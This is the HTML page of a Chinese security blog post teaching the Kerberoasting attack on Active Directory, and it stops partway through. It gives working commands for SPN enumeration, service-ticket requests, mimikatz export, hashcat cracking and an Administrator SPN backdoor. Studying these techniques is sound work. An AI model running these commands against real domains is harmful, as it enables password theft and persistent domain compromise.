@@ -1,0 +1,1347 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Noto Serif SC:300,300italic,400,400italic,700,700italic|Roboto Mono:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Shu1L's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="kerberosating攻击学习前言​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="kerberosating攻击学习">
+<meta property="og:url" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/index.html">
+<meta property="og:site_name" content="Shu1L&#39;s blog">
+<meta property="og:description" content="kerberosating攻击学习前言​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805123917.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805125050.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/2-2.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/2-3.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/2-4.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/3-1.png">
+<meta property="og:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/3-2.png">
+<meta property="article:published_time" content="2020-08-05T09:04:33.000Z">
+<meta property="article:modified_time" content="2020-08-05T11:23:25.755Z">
+<meta property="article:author" content="Shu1L">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/QQ%E6%88%AA%E5%9B%BE20200805123917.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/"/>
+
+
+
+
+
+  <title>kerberosating攻击学习 | Shu1L's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Shu1L's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一只菜鸟白帽子</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/08/05/kerberosating-gong-ji-xue-xi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Shu1L's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">kerberosating攻击学习</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-05T17:04:33+08:00">
+                2020-08-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="kerberosating攻击学习"><a href="#kerberosating攻击学习" class="headerlink" title="kerberosating攻击学习"></a>kerberosating攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="kerberos协议认证"><a href="#kerberos协议认证" class="headerlink" title="kerberos协议认证"></a>kerberos协议认证</h4><p>可以参考前面关于票据部分的讲解。</p>
+<p>kerberos协议的认证授权过程，3次涉及使用<strong>不同账户的NTLM</strong>作为密钥加密数据。</p>
+<ul>
+<li>使用<strong>域用户</strong>的NTLM加密认证请求票据</li>
+<li>KDC使用<strong>Krbtgt账号</strong>的NTLM加密认证后的票据TGT</li>
+<li>KDC使用<strong>运行服务的服务账号</strong>的NTLM加密授权票据TGS</li>
+</ul>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200805123917.png" alt=""></p>
+<p>​            当发布Windows 2000和Active Directory时，微软打算在 Windows NT 和Windows 95 上也支持Active Directory，这意味着不仅会产生各种各样的安全问题也会导致更多不安全的配置方式。同时，也意味着，微软要保证在多个不同版本的 Windows 客户端上均支持Kerberos协议。</p>
+<p>​            要实现这个想法的一个简单的办法就是在Kerberos协议中使用<strong>RC4加密算法</strong>·，并将<strong>NTLM密码哈希</strong>作为该加密算法的私钥，该私钥可用于加密或签名Kerberos票证。因此，对于攻击者来说，一旦发现了 NTLM 密码哈希，就可以随意使用，包括重新拿回Active Directory域权限（比如：黄金票证和白银票证攻击）。</p>
+<h4 id="SPN（ServicePrincipal-Names-服务主体名称"><a href="#SPN（ServicePrincipal-Names-服务主体名称" class="headerlink" title="SPN（ServicePrincipal Names)服务主体名称"></a>SPN（ServicePrincipal Names)服务主体名称</h4><p>官方文档：</p>
+<p><a href="https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/desktop/AD/service-principal-names</a></p>
+<p>全称<code>Service Principal Names</code></p>
+<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN。</p>
+<p>SPN分为两种，一种注册在<strong>AD上机器帐户(Computers)</strong>下，另一种注册在<strong>域用户帐户(Users)</strong>下</p>
+<p>当一个服务的权限为<code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
+<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
+<p><strong>SPN的格式</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass<span class="regexp">/host:port/</span>servicename</span><br></pre></td></tr></table></figure>
+
+<p>说明：</p>
+<ul>
+<li>serviceclass可以理解为服务的名称，常见的有www, ldap, SMTP, DNS, HOST等</li>
+<li>host有两种形式，FQDN和NetBIOS名，例如server01.test.com和server01</li>
+<li>如果服务运行在默认端口上，则端口号(port)可以省略</li>
+</ul>
+<p><img src="QQ%E6%88%AA%E5%9B%BE20200805125050.png" alt=""></p>
+<p><strong>查询SPN</strong></p>
+<p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分，因此查询SPN的操作很难被检测。</p>
+<h6 id="1-使用SetSPN"><a href="#1-使用SetSPN" class="headerlink" title="(1) 使用SetSPN"></a>(1) 使用SetSPN</h6><p>Win7和Windows Server2008自带的工具</p>
+<p>查看当前域内的所有SPN：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<p>查看test域内的所有SPN：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -T test -<span class="selector-tag">q</span> *<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="简述Kerberosating攻击"><a href="#简述Kerberosating攻击" class="headerlink" title="简述Kerberosating攻击"></a>简述Kerberosating攻击</h4><p>Kerberos使用公开的对称加密算法</p>
+<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">y</span> = f (<span class="symbol">x</span>,key)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>F为已知的对称加密算法 ，如<strong>RC4-HMAC</strong></li>
+<li>x为待加密的数据，包含时间戳，其他为固定格式的内容, </li>
+<li>key为加密密钥，即NTLM</li>
+<li>y为加密后的数据</li>
+</ul>
+<p>如果能从Kerberos域网络中获取y,则根据已知算法f，使用不同的f可推算出不同的x。 由于x中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的是否为要寻找的口令.</p>
+<h5 id="选择SPN服务账号的原因"><a href="#选择SPN服务账号的原因" class="headerlink" title="选择SPN服务账号的原因"></a>选择SPN服务账号的原因</h5><p>在域内主要有<strong>主机账号</strong>、<strong>用户账号</strong>、<strong>服务账号</strong>等3种主要账号类型 </p>
+<ul>
+<li>主机账号的口令由系统随机设置，几乎不能破解，而且每30天自动变更一次用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。</li>
+<li>服务账号的口令存在很大的特殊性，口令在应用软件安装时往往自动设定，复杂度往往较为简单口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行MS SQL Server 服务的sqlsvc账号等</li>
+<li>SPN存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有SPN服务。因为主机账号的口 令几乎不能破解，所以只查询用户账号的SPN。</li>
+</ul>
+<h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><ul>
+<li><p>查询SPN，找到有价值的SPN</p>
+<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+</li>
+<li><p>请求服务票据(tgs)</p>
+</li>
+<li><p>导出服务票据(tgs)</p>
+</li>
+<li><p>重写服务票据&amp;RAM注入</p>
+</li>
+</ul>
+<h5 id="实现Kerberoasting攻击的前提"><a href="#实现Kerberoasting攻击的前提" class="headerlink" title="实现Kerberoasting攻击的前提"></a>实现Kerberoasting攻击的前提</h5><ul>
+<li>对于kerberos协议认证过程中返回的tgs_reply，在已知加密算法的前提下，我们可以尝试穷举口令。(<strong>服务密码一般默认为弱密码</strong>)</li>
+<li>Windows系统通过SPN查询获得服务和服务实例帐户的对应关系</li>
+<li>域内的主机都能查询SPN。</li>
+<li>域内的任何用户都可以向域内的任何服务请求TGS。</li>
+</ul>
+<h4 id="Kerberoasting攻击的利用"><a href="#Kerberoasting攻击的利用" class="headerlink" title="Kerberoasting攻击的利用"></a>Kerberoasting攻击的利用</h4><h5 id="使用-Rubeus工具"><a href="#使用-Rubeus工具" class="headerlink" title="使用 Rubeus工具"></a>使用 Rubeus工具</h5><p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
+<p>这是一个专门针对Kerberos的工具包，这个编译好像比较费事。。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C:\Rubeus&gt;Rubeus.exe kerberoast</span><br><span class="line"></span><br><span class="line"> ______        _</span><br><span class="line">(_____ \      |<span class="string"> </span>|</span><br><span class="line"> _____) )_   _|<span class="string"> </span>|<span class="string">__  _____ _   _  ___</span></span><br><span class="line">|<span class="string">  __  /</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \</span>|<span class="string"> ___ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/___)</span></span><br><span class="line">|<span class="string"> </span>|<span class="string">  \ \</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_) ) ____</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">___ </span>|</span><br><span class="line">|<span class="string">_</span>|<span class="string">   </span>|<span class="string">_</span>|<span class="string">____/</span>|<span class="string">____/</span>|<span class="string">_____)____/(___/</span></span><br><span class="line"></span><br><span class="line"><span class="string">v1.5.0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] Action: Kerberoasting</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : zeo</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=harmj0y,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : asdf/asdfasdf</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$zeolab.local$asdf/asdfasdf*$AE5F019D4CDED6CD74830CC......</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">[*] SamAccountName         : sqlservice</span></span><br><span class="line"><span class="string">[*] DistinguishedName      : CN=SQL,CN=Users,DC=zeolab,DC=local</span></span><br><span class="line"><span class="string">[*] ServicePrincipalName   : MSSQLSvc/SQL.zeolab.local</span></span><br><span class="line"><span class="string">[*] Hash                   : $krb5tgs$23$*$testlab.local$MSSQLSvc/SQL.zeolab.local*$E2B3869290......</span></span><br></pre></td></tr></table></figure>
+
+<p>将哈希保存为hash.txt文件，放到hashcat的目录下。使用命令</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">hashcat64</span><span class="selector-class">.exe</span> <span class="selector-tag">-m</span> 13100 <span class="selector-tag">hash</span><span class="selector-class">.txt</span> <span class="selector-tag">pass</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
+
+<p>离线破解服务票据</p>
+<h5 id="1、获得有价值的SPN"><a href="#1、获得有价值的SPN" class="headerlink" title="1、获得有价值的SPN"></a>1、获得有价值的SPN</h5><p>需要满足以下条件：</p>
+<ul>
+<li>该SPN注册在域用户帐户(Users)下</li>
+<li>域用户账户的权限很高</li>
+</ul>
+<p>可以选择以下三种方法：</p>
+<h5 id="1-使用powershell模块Active-Directory"><a href="#1-使用powershell模块Active-Directory" class="headerlink" title="(1)使用powershell模块Active Directory"></a>(1)使用powershell模块Active Directory</h5><p><strong>注：</strong>powershell模块Active Directory 需要提前安装，域控制器一般会安装</p>
+<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">import-module </span><span class="string">ActiveDirectory</span></span><br><span class="line"><span class="string">get-</span><span class="string">aduser </span>-<span class="string">filter </span>&#123;<span class="string">AdminCount </span>-<span class="string">eq </span>1 -<span class="string">and </span>(<span class="string">servicePrincipalName </span>-<span class="string">ne </span>0)&#125; -<span class="string">prop </span>* |<span class="string">select </span><span class="string">name,</span><span class="string">whencreated,</span><span class="string">pwdlastset,</span><span class="string">lastlogon</span></span><br></pre></td></tr></table></figure>
+
+<p>对于未安装Active Directory模块的系统，可以通过如下命令导入Active Directory模块：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-<span class="keyword">module</span> .\<span class="module-access"><span class="module"><span class="identifier">Microsoft</span>.</span><span class="module"><span class="identifier">ActiveDirectory</span>.</span><span class="module"><span class="identifier">Management</span>.</span></span>dll</span><br></pre></td></tr></table></figure>
+
+<p>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
+<p><a href="https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll" target="_blank" rel="noopener">https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</a></p>
+<h4 id="2-使用PowerView"><a href="#2-使用PowerView" class="headerlink" title="(2)使用PowerView"></a>(2)使用PowerView</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Get</span>-NetUser -spn -AdminCount|<span class="keyword">Select</span> <span class="type">name</span>,whencreated,pwdlastset,lastlogon</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-使用kerberoast"><a href="#3-使用kerberoast" class="headerlink" title="(3)使用kerberoast"></a>(3)使用kerberoast</h4><p>powershell:</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1</a></p>
+<p>vbs:</p>
+<p><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.vbs</a></p>
+<p>参数如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript <span class="module-access"><span class="module"><span class="identifier">GetUserSPNs</span>.</span></span>vbs</span><br></pre></td></tr></table></figure>
+
+<h3 id="2、请求TGS"><a href="#2、请求TGS" class="headerlink" title="2、请求TGS"></a>2、请求TGS</h3><h4 id="1-请求指定TGS"><a href="#1-请求指定TGS" class="headerlink" title="(1)请求指定TGS"></a>(1)请求指定TGS</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SPNName</span> = <span class="string">'MSSQLSvc/DC1.test.com'</span></span><br><span class="line">Add-Type -AssemblyNAme System.IdentityModel</span><br><span class="line">New-Object System<span class="selector-class">.IdentityModel</span><span class="selector-class">.Tokens</span><span class="selector-class">.KerberosRequestorSecurityToken</span> -ArgumentList <span class="variable">$SPNName</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="2-请求所有TGS"><a href="#2-请求所有TGS" class="headerlink" title="(2)请求所有TGS"></a>(2)请求所有TGS</h4><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Add</span>-<span class="keyword">Type</span> -AssemblyName System.IdentityModel  </span><br><span class="line">setspn.exe -q */* | <span class="type">Select</span>-String '^CN' -<span class="keyword">Context</span> <span class="number">0</span>,<span class="number">1</span> | <span class="type">% &#123; New</span>-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $<span class="keyword">_</span>.<span class="keyword">Context</span>.PostContext[<span class="number">0</span>].Trim() &#125;</span><br></pre></td></tr></table></figure>
+
+<p>执行后输入<code>klist</code>查看内存中的票据，可找到获得的TGS</p>
+<h3 id="3、导出"><a href="#3、导出" class="headerlink" title="3、导出"></a>3、导出</h3><p>使用mimikatz</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::<span class="built_in">list</span> /<span class="keyword">export</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4、破解"><a href="#4、破解" class="headerlink" title="4、破解"></a>4、破解</h3><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tgsrepcrack<span class="selector-class">.py</span> wordlist<span class="selector-class">.txt</span> test.kirbi</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x05-Kerberoasting的实现方法二"><a href="#0x05-Kerberoasting的实现方法二" class="headerlink" title="0x05 Kerberoasting的实现方法二"></a>0x05 Kerberoasting的实现方法二</h2><hr>
+<p>自动实现，并且不需要mimikatz，普通用户权限即可，参考资料：</p>
+<p><a href="http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/</a></p>
+<p>代码地址：</p>
+<p><a href="https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921" target="_blank" rel="noopener">https://github.com/EmpireProject/Empire/commit/6ee7e036607a62b0192daed46d3711afc65c3921</a></p>
+<p>使用<code>System.IdentityModel.Tokens.KerberosRequestorSecurityToken</code>请求TGS，在返回结果中提取出TGS，输出的TGS可选择John the Ripper或Hashcat进行破解</p>
+<p>实例演示：</p>
+<p>在域内一台主机上以普通用户权限执行：</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat <span class="string">| fl</span></span><br></pre></td></tr></table></figure>
+
+<p>-AdminCount表示选择高权限的用户</p>
+<p>输出结果如下图</p>
+<p><img src="2-2.png" alt="Alt text"></p>
+<p>只提取出hash的参数如下：</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | <span class="type">Select</span> hash | <span class="type">ConvertTo</span>-CSV -NoTypeInformation</span><br></pre></td></tr></table></figure>
+
+<p>输出结果如下图</p>
+<p><img src="2-3.png" alt="Alt text"></p>
+<p>使用hashcat破解的参数如下：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13100 <span class="string">/tmp/hash.txt</span> <span class="string">/tmp/password.list</span> -o found.txt <span class="params">--force</span></span><br></pre></td></tr></table></figure>
+
+<p>破解结果如下图，成功获得明文口令<code>MySQLAdmin111!</code></p>
+<p><img src="2-4.png" alt="Alt text"></p>
+<p><strong>注：</strong></p>
+<p>Rubeus也可以实现Invoke-Kerberoast的功能，地址如下：</p>
+<p><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">https://github.com/GhostPack/Rubeus</a></p>
+<p>参数如下：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">Rubeus</span>.</span></span>exe kerberoast</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x06-Kerberoasting的后门利用"><a href="#0x06-Kerberoasting的后门利用" class="headerlink" title="0x06 Kerberoasting的后门利用"></a>0x06 Kerberoasting的后门利用</h2><hr>
+<p>在我们取得了SPN的修改权限后，可以为指定的域用户添加一个SPN，这样可以随时获得该域用户的TGS，经过破解后获得明文口令</p>
+<p>例如为域用户<code>Administrator</code>添加<code>SPNVNC/DC1.test.com</code>，参数如下：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn<span class="selector-class">.exe</span> -U -A VNC/DC1<span class="selector-class">.test</span><span class="selector-class">.com</span> Administrator</span><br></pre></td></tr></table></figure>
+
+<p>如下图</p>
